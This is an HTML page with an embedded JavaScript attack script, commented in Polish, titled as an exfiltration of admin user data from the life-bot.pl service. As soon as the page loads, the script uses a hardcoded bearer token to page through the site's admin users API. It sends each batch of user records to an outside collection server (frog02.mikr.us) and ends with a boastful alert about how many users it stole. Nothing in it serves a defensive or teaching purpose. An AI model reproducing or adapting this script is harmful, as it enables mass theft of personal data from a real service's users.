<!DOCTYPE html>
<html>
<head>
  <title>Life-bot admin users exfil</title>
</head>
<body>
  <h1>Trwa kradzież bazy użytkowników life-bot.pl...</h1>
  <script>
    const token = "429efc31e41340a8a8194b98e97759729d13938255794b6b8cef4ce51eef3151"; // twój token usera

    let page = 0;
    const size = 500;
    let allUsers = [];

    function steal() {
      fetch(`https://api.life-bot.pl/api/admin/users/paginated?page=${page}&size=${size}&sort=id,asc`, {
        method: "GET",
        headers: {
          "Authorization": `Bearer ${token}`
        },
        credentials: "include",
        mode: "cors"
      })
      .then(r => r.json())
      .then(data => {
        if (data.content && data.content.length > 0) {
          allUsers = allUsers.concat(data.content);
          console.log(`Strona ${page} – skradziono ${data.content.length} użytkowników (razem: ${allUsers.length})`);
          
          // pushujemy od razu na Twój serwer
          fetch("http://frog02.mikr.us:20384/collect.php", {  // <-- zmień na swój serwer (ngrok, webhook.site, itd.)
            method: "POST",
            body: JSON.stringify({
              page: page,
              users: data.content,
              totalSoFar: allUsers.length
            })
          });

          page++;
          setTimeout(steal, 800); // co 0.8s kolejna strona
        } else {
          alert(`KONIEC! Ukradłem ${allUsers.length} użytkowników!`);
          fetch("http://frog02.mikr.us:20384/collect.php", {
            method: "POST",
            body: JSON.stringify({ finished: true, total: allUsers.length, allUsers: allUsers })
          });
        }
      })
      .catch(e => console.log("błąd albo rate-limit"));
    }

    steal();
  </script>
</body>
</html>
